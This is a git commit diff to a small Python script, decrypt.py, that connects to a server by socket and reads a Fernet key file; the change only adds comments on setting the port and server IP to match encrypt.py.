894fb41ad4ee3a8b98caddbd92044c0f0d1b2fb4
ath0rus <65640442+ath0rus@users.noreply.github.com>
2021-10-12 14:55:22 +1000

    Update decrypt.py

--- V1/decrypt.py
+++ V1/decrypt.py
@@ -2,8 +2,8 @@ import socket
 from cryptography.fernet import Fernet
 
 s = socket.socket()
-port = 5050
-ip = #replace with server ip
+port = 5050 #Change if you want, if you do change it pick a port above 1024. Must be the same in encrypt.py
+ip = #replace with server ip e.g. '1.1.1.1' Must be the same in encrypt.py
 s.connect((ip, port))
 
 with open("Key.key", "rb") as r:
